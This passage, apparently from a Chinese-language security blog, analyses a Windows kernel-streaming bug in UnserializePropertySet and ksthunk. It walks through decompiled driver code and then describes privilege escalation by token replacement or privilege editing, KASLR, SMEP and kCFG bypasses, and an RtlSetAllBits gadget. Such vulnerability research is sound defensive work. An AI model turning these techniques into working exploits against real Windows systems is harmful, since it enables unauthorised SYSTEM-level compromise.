class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">   v9 = *(_DWORD *)(v5 + <span class="number">16</span>);</span><br><span class="line">   v10 = (<span class="type">char</span> *)(v5 + <span class="number">20</span>);</span><br><span class="line">   v11 = v7 - <span class="number">20</span>;</span><br><span class="line">   v12 = BytesReturned;</span><br><span class="line">   <span class="keyword">while</span> ( v11 &amp;&amp; v9 )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( v11 &lt; <span class="number">0x20</span> )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">     v13 = v10;</span><br><span class="line">     <span class="keyword">if</span> ( *((_DWORD *)v10 + <span class="number">5</span>) )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">     PoolWithTag[<span class="number">4</span>] = *((_DWORD *)v10 + <span class="number">6</span>);</span><br><span class="line">     v14 = v11 - <span class="number">32</span>;</span><br><span class="line">     OutBuffer = v10 + <span class="number">32</span>;</span><br><span class="line">     OutSize = *((_DWORD *)v13 + <span class="number">7</span>);</span><br><span class="line">     <span class="keyword">if</span> ( OutSize &gt; v14 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">     v17 = <span class="built_in">KsSynchronousIoControlDevice</span>(</span><br><span class="line">             *(PFILE_OBJECT *)(v12 + <span class="number">48</span>),</span><br><span class="line">             <span class="number">0</span>,</span><br><span class="line">             *(_DWORD *)(v12 + <span class="number">24</span>),</span><br><span class="line">             PoolWithTag,</span><br><span class="line">             InSize,</span><br><span class="line">             OutBuffer, <span class="comment">//[2]</span></span><br><span class="line">             OutSize,</span><br><span class="line">             (PULONG)&amp;BytesReturned);</span><br></pre></td></tr></table></figure><p>可以看到<code>*(const void **)(v6 + 0x20)</code>[1]和<code>OutBuffer</code>[2]都是从参数a1进行偏移得到的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">UnserializePropertySet</span>((__int64)Irp, v21, v7);</span><br></pre></td></tr></table></figure><p>而调用的时候的参数a1是<code>Irp</code></p><p>Irp的符号是<code>_IRP</code>，找到对应的结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xd0 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IRP</span></span><br><span class="line">&#123;</span><br><span class="line">    SHORT Type;                                                             <span class="comment">//0x0</span></span><br><span class="line">    USHORT Size;                                                            <span class="comment">//0x2</span></span><br><span class="line">    USHORT AllocationProcessorNumber;                                       <span class="comment">//0x4</span></span><br><span class="line">    USHORT Reserved;                                                        <span class="comment">//0x6</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_MDL</span>* MdlAddress;                                                <span class="comment">//0x8</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_IRP</span>* MasterIrp;                                             <span class="comment">//0x18</span></span><br><span class="line">        LONG IrpCount;                                                      <span class="comment">//0x18</span></span><br><span class="line">        VOID* SystemBuffer;                                                 <span class="comment">//0x18</span></span><br><span class="line">    &#125; AssociatedIrp;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ThreadListEntry;                                     <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span> IoStatus;                                       <span class="comment">//0x30</span></span><br><span class="line">    CHAR RequestorMode;                                                     <span class="comment">//0x40</span></span><br><span class="line">    UCHAR PendingReturned;                                                  <span class="comment">//0x41</span></span><br><span class="line">    CHAR StackCount;                                                        <span class="comment">//0x42</span></span><br><span class="line">    CHAR CurrentLocation;                                                   <span class="comment">//0x43</span></span><br><span class="line">    UCHAR Cancel;                                                           <span class="comment">//0x44</span></span><br><span class="line">    UCHAR CancelIrql;                                                       <span class="comment">//0x45</span></span><br><span class="line">    CHAR ApcEnvironment;                                                    <span class="comment">//0x46</span></span><br><span class="line">    UCHAR AllocationFlags;                                                  <span class="comment">//0x47</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_STATUS_BLOCK</span>* UserIosb;                                      <span class="comment">//0x48</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_KEVENT</span>* UserEvent;                                              <span class="comment">//0x50</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">VOID</span> (*UserApcRoutine)(VOID* arg1, <span class="keyword">struct</span> _IO_STATUS_BLOCK* arg2, ULONG arg3); <span class="comment">//0x58</span></span><br><span class="line">                VOID* IssuingProcess;                                       <span class="comment">//0x58</span></span><br><span class="line">            &#125;;</span><br><span class="line">            VOID* UserApcContext;                                           <span class="comment">//0x60</span></span><br><span class="line">        &#125; AsynchronousParameters;                                           <span class="comment">//0x58</span></span><br><span class="line">        <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> AllocationSize;                                <span class="comment">//0x58</span></span><br><span class="line">    &#125; Overlay;                                                              <span class="comment">//0x58</span></span><br><span class="line">    <span class="built_in">VOID</span> (*CancelRoutine)(<span class="keyword">struct</span> _DEVICE_OBJECT* arg1, <span class="keyword">struct</span> _IRP* arg2);  <span class="comment">//0x68</span></span><br><span class="line">    VOID* UserBuffer;                                                       <span class="comment">//0x70</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">_KDEVICE_QUEUE_ENTRY</span> DeviceQueueEntry;               <span class="comment">//0x78</span></span><br><span class="line">                VOID* DriverContext[<span class="number">4</span>];                                     <span class="comment">//0x78</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_ETHREAD</span>* Thread;                                        <span class="comment">//0x98</span></span><br><span class="line">            CHAR* AuxiliaryBuffer;                                          <span class="comment">//0xa0</span></span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> ListEntry;                                   <span class="comment">//0xa8</span></span><br><span class="line">            <span class="keyword">union</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span>* CurrentStackLocation;            <span class="comment">//0xb8</span></span><br><span class="line">                ULONG PacketType;                                           <span class="comment">//0xb8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">struct</span> <span class="title class_">_FILE_OBJECT</span>* OriginalFileObject;                        <span class="comment">//0xc0</span></span><br><span class="line">            VOID* IrpExtension;                                             <span class="comment">//0xc8</span></span><br><span class="line">        &#125; Overlay;                                                          <span class="comment">//0x78</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_KAPC</span> Apc;                                                   <span class="comment">//0x78</span></span><br><span class="line">        VOID* CompletionKey;                                                <span class="comment">//0x78</span></span><br><span class="line">    &#125; Tail;                                                                 <span class="comment">//0x78</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>v6 = *(_QWORD *)(Irp + 0xB8);</code>对应<code>_IRP-&gt;CurrentStackLocation</code></p><p>而<code>*(const void **)(v6 + 0x20)</code>对应<code>_IRP-&gt;CurrentStackLocation-&gt;DeviceIoControl-&gt;Type3InputBuffer</code>，这个参数是用户可控的</p><blockquote><p>但是其实对应到0x20的还有几个成员，估计得之后分析才能解决为什么是对应这个的问题了，我认为是因为本身这个函数操纵的就是device相关的，因此可以认定就是有关 <em>DeviceIoControl</em> 的成员</p></blockquote><p>而经过我的分析<code>OutBuffer</code>就是<code>_IO_STATUS_BLOCK-&gt;Pointer</code>，也是来自于用户的Irp请求，现在就要看用户能控制Irp请求到什么level了</p><p>而调用 <em>UnserializePropertySet</em> 时的流程，大概如下图所示 ：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116865.png" alt="image-20250904141946368" style="zoom:50%;" /><p>第一次 IOCTL 时可以看到图中第 2 步 I&#x2F;O Manager 会将 <code>Irp-&gt;RequestorMode</code> 设成 UserMode（1），直到第 6 步时，ks 会去判断用户 <em>requests</em> 的 <em>Property</em> 是否存在于该 KS Object 中，如果该 KS Object 的 <em>Property</em> <strong>存在</strong> ，并且 <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> 就会用 <code>UnserializePropertySet</code> 来处理指定的 <em>Property</em></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116866.png" alt="image-20250904142120404" style="zoom:50%;" /><p>而接下来第 7 步就会呼叫 <em>KsSynchronousIoControlDevice</em> 重新做一次 IOCTL，而此时新的 <code>Irp-&gt;RequestorMode</code> 就变成了 KernelMode（0） 了，而后续的处理就如一般的 <em>IOCTL_KS_PROPERTY</em> 相同</p><p>接下来就看怎么调用到<code>UnserializePropertySet</code>了</p><h3 id="ksthunk-CKSThunkDevice-DispatchIoctl"><a href="#ksthunk-CKSThunkDevice-DispatchIoctl" class="headerlink" title="ksthunk!CKSThunkDevice::DispatchIoctl"></a>ksthunk!CKSThunkDevice::DispatchIoctl</h3><p>最先看到的想必就是入口点 ksthunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CKSThunkDevice::DispatchIoctl</span><span class="params">(CKernelFilterDevice *a1, IRP *a2, <span class="type">unsigned</span> <span class="type">int</span> a3, <span class="type">int</span> *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CKernelFilterFile</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// r8</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v9 = CKernelFilterDevice::<span class="built_in">FileObjectToFilterFile</span>(a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(<span class="keyword">struct</span> CKernelFilterFile *, IRP *, _QWORD, <span class="type">int</span> *))(*(_QWORD *)v9 + <span class="number">40LL</span>))(</span><br><span class="line">             v9,</span><br><span class="line">             a2,</span><br><span class="line">             a3,</span><br><span class="line">             a4);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">IoIs32bitProcess</span>(a2) &amp;&amp; a2-&gt;RequestorMode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080195</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkPropertyIrp</span>((<span class="type">char</span> *)a1 + <span class="number">64</span>, a2, v11, a4);</span><br><span class="line">    v12 = CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart - <span class="number">3080199</span>;</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080199</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkEnableEventIrp</span>(v12, a2, v11, a4);</span><br><span class="line">    <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">3080203</span> )</span><br><span class="line">      <span class="keyword">return</span> CKSAutomationThunk::<span class="built_in">ThunkDisableEventIrp</span>(v12, a2, v11, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart == <span class="number">0x2F0003</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> CKSThunkDevice::<span class="built_in">CheckIrpForStackAdjustmentNative</span>((__int64)a1, a2, v11, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是64位的请求，会执行<code>CKSThunkDevice::CheckIrpForStackAdjustmentNative</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116867.png" alt="image-20250904183404906"></p><p>而在该函数中存在一个对RequestorMode的检查，如果是UserMode访问，会直接返回一个Error代码，但是因为上述分析的第二次IOCTL的处理是KernelMode的，会直接将我们输入的内容作为函数处理，并且第一个参数是可控的</p><h2 id="常见的EoP方法"><a href="#常见的EoP方法" class="headerlink" title="常见的EoP方法"></a>常见的EoP方法</h2><h3 id="替换token"><a href="#替换token" class="headerlink" title="替换token"></a>替换token</h3><p><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation">用System token 取代当前的Process token</a></p><ul><li>系统上运行的每个进程都有其相应的 <code>_EPROCESS</code> 内核结构</li><li><code>_EPROCESS</code> 结构包含指向描述进程安全上下文的 <code>_TOKEN</code> 内存结构的指针</li><li>内核漏洞利用找到低特权进程的 <code>_TOKEN</code> 结构的地址 - 它想要从中升级的进程</li><li>内核漏洞利用查找特权进程的 <code>_TOKEN</code> 结构的地址，以 <code>NT\SYSTEM</code> 形式运行</li><li>内核漏洞利用将低特权进程的令牌替换为高特权令牌</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116868.png" alt="image-20250904215419279" style="zoom:50%;" /><blockquote><p>在win11中，<code>_EX_FAST_REF</code>是Token的结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EX_FAST_REF</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">union</span></span><br><span class="line"> &#123;</span><br><span class="line">     VOID* Object;                                                       <span class="comment">//0x0</span></span><br><span class="line">     ULONGLONG RefCnt:<span class="number">4</span>;                                                 <span class="comment">//0x0</span></span><br><span class="line">     ULONGLONG Value;                                                    <span class="comment">//0x0</span></span><br><span class="line"> &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>这里RefCnt是引用计数，占最后四个bit，例如0x7FFF FFFF，则真正的token是0x7FFF FFF0，然后0xF是引用的次数</p></blockquote><h3 id="修改token权限"><a href="#修改token权限" class="headerlink" title="修改token权限"></a>修改token权限</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x498 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_TOKEN</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TOKEN_SOURCE</span> TokenSource;                                       <span class="comment">//0x0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> TokenId;                                                   <span class="comment">//0x10</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> AuthenticationId;                                          <span class="comment">//0x18</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> ParentTokenId;                                             <span class="comment">//0x20</span></span><br><span class="line">    <span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> ExpirationTime;                                    <span class="comment">//0x28</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ERESOURCE</span>* TokenLock;                                           <span class="comment">//0x30</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> ModifiedId;                                                <span class="comment">//0x38</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span> Privileges;                                <span class="comment">//0x40</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_AUDIT_POLICY</span> AuditPolicy;                                   <span class="comment">//0x58</span></span><br><span class="line">    ULONG SessionId;                                                        <span class="comment">//0x78</span></span><br><span class="line">    ULONG UserAndGroupCount;                                                <span class="comment">//0x7c</span></span><br><span class="line">    ULONG RestrictedSidCount;                                               <span class="comment">//0x80</span></span><br><span class="line">    ULONG VariableLength;                                                   <span class="comment">//0x84</span></span><br><span class="line">    ULONG DynamicCharged;                                                   <span class="comment">//0x88</span></span><br><span class="line">    ULONG DynamicAvailable;                                                 <span class="comment">//0x8c</span></span><br><span class="line">    ULONG DefaultOwnerIndex;                                                <span class="comment">//0x90</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* UserAndGroups;                              <span class="comment">//0x98</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* RestrictedSids;                             <span class="comment">//0xa0</span></span><br><span class="line">    VOID* PrimaryGroup;                                                     <span class="comment">//0xa8</span></span><br><span class="line">    ULONG* DynamicPart;                                                     <span class="comment">//0xb0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACL</span>* DefaultDacl;                                               <span class="comment">//0xb8</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">_TOKEN_TYPE</span> TokenType;                                             <span class="comment">//0xc0</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">_SECURITY_IMPERSONATION_LEVEL</span> ImpersonationLevel;                  <span class="comment">//0xc4</span></span><br><span class="line">    ULONG TokenFlags;                                                       <span class="comment">//0xc8</span></span><br><span class="line">    UCHAR TokenInUse;                                                       <span class="comment">//0xcc</span></span><br><span class="line">    ULONG IntegrityLevelIndex;                                              <span class="comment">//0xd0</span></span><br><span class="line">    ULONG MandatoryPolicy;                                                  <span class="comment">//0xd4</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LOGON_SESSION_REFERENCES</span>* LogonSession;                     <span class="comment">//0xd8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_LUID</span> OriginatingLogonSession;                                   <span class="comment">//0xe0</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> SidHash;                                <span class="comment">//0xe8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> RestrictedSidHash;                      <span class="comment">//0x1f8</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION</span>* pSecurityAttributes; <span class="comment">//0x308</span></span><br><span class="line">    VOID* Package;                                                          <span class="comment">//0x310</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES</span>* Capabilities;                               <span class="comment">//0x318</span></span><br><span class="line">    ULONG CapabilityCount;                                                  <span class="comment">//0x320</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SID_AND_ATTRIBUTES_HASH</span> CapabilitiesHash;                       <span class="comment">//0x328</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LOWBOX_NUMBER_ENTRY</span>* LowboxNumberEntry;                     <span class="comment">//0x438</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_CACHED_HANDLES_ENTRY</span>* LowboxHandlesEntry;                   <span class="comment">//0x440</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION</span>* pClaimAttributes;       <span class="comment">//0x448</span></span><br><span class="line">    VOID* TrustLevelSid;                                                    <span class="comment">//0x450</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TOKEN</span>* TrustLinkedToken;                                        <span class="comment">//0x458</span></span><br><span class="line">    VOID* IntegrityLevelSidValue;                                           <span class="comment">//0x460</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_SID_VALUES_BLOCK</span>* TokenSidValues;                           <span class="comment">//0x468</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_LUID_TO_INDEX_MAP_ENTRY</span>* IndexEntry;                        <span class="comment">//0x470</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_DIAG_TRACK_ENTRY</span>* DiagnosticInfo;                     <span class="comment">//0x478</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_SEP_CACHED_HANDLES_ENTRY</span>* BnoIsolationHandlesEntry;             <span class="comment">//0x480</span></span><br><span class="line">    VOID* SessionObject;                                                    <span class="comment">//0x488</span></span><br><span class="line">    ULONGLONG VariablePart;                                                 <span class="comment">//0x490</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span> Privileges;                                <span class="comment">//0x40</span></span><br></pre></td></tr></table></figure><p>这个结构体显示了哪些权限disable，哪些权限enable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_SEP_TOKEN_PRIVILEGES</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONGLONG Present;                                                      <span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG Enabled;                                                      <span class="comment">//0x8</span></span><br><span class="line">    ULONGLONG EnabledByDefault;                                             <span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>将 <em>SYSTEM</em> 的 Present 赋给 任意一个进程的 Present ，就成功 <em>SYSTEM</em> 了</p><h2 id="bypass保护机制"><a href="#bypass保护机制" class="headerlink" title="bypass保护机制"></a>bypass保护机制</h2><p>那么接下来就是需要bypass一些保护机制：kCFG、kASLR、SMEP 等等保护</p><p>**内核地址随机化(KASLR)**：Windows 定义了四个完整性级别：低、中、高和SYSTEM，在中等性完整度级别下，可以通过使用众所周知的<a href="https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-enumdevicedrivers">EnumDeviceDrivers</a>和<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winternl/nf-winternl-ntquerysysteminformation">NtQuerySystemInformation</a> API，轻易饶过KASLR</p><p><strong>SMEP</strong>：不允许ring0执行ring3的代码，但是可以通过使用内核模式ROP gadget在内核中执行 或者 将shellcode的指针传入内核模式中，然后内核在内核的上下文中执行用户模式的代码（shellcode）</p><p>因此在中等性完整度级别下（ring2），最需要考虑的是<strong>kCFG</strong></p><p>kCFG 中合法的function 名称有set 的function，比较可能是可以写入的。我们这里是直接拿ntoskrnl.exe 中 export fucntion 去寻找看看是否有合法的function，这些大多情况下都是合法的。</p><p>在ntoskrnl.exe下的RtlSetAllBits函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">RtlSetAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *Buffer; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> __int64)(<span class="number">4</span> * (((BitMapHeader-&gt;SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span>) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)Buffer &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *Buffer = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !--v2 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      ++Buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0xFF</span>u, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ( (v2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它是个非常好用的gadget 而且是kCFG 中合法的function，另外也只要控制一个参数<code>_RTL_BITMAP</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 